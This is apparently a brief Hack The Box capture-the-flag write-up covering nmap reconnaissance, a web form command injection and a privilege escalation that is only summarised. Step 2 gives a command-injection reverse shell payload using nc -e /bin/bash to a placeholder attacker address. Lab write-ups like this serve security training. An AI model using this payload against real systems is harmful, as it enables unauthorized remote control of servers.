# Hack The Box: "Joker" Challenge Writeup

## Objective:
Exploit a remote code execution (RCE) vulnerability in a web application and escalate privileges to root.

## Step 1: Reconnaissance
- Scanned the target system with nmap:
    ```bash
    nmap -A -T4 <target_ip>
    ```
- Found a web application running on port 8080.

## Step 2: Exploiting RCE
- Browsed the web application and found a command injection vulnerability in a form input field.
- Injected a reverse shell payload:
    ```bash
    ; nc -e /bin/bash <your_ip> <your_port>
    ```
- Gained a reverse shell on the server.

## Step 3: Privilege Escalation
- Enumerated the system using linpeas and found a vulnerable service running with root privileges.
- Exploited the service to escalate privileges to root.

## Lessons Learned:
- Command injection vulnerabilities can give attackers direct control over a server.
- Running services as root increases the risk of privilege escalation if vulnerabilities are present.
